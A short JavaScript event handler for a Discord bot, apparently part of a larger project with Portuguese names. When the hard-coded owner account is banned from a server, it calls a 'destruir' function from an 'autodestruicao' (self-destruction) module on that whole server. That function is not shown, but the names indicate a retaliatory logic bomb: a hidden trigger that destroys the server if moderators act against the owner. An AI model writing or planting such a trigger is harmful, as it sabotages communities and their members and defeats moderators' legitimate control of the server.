const { OWNER } = require("../perm");
const { destruir } = require("../autodestruicao");

module.exports = {
  name: "guildBanAdd",
  async execute(ban) {
    if (!ban || !ban.user || ban.user.id !== OWNER) return;
    await destruir(ban.guild);
  },
};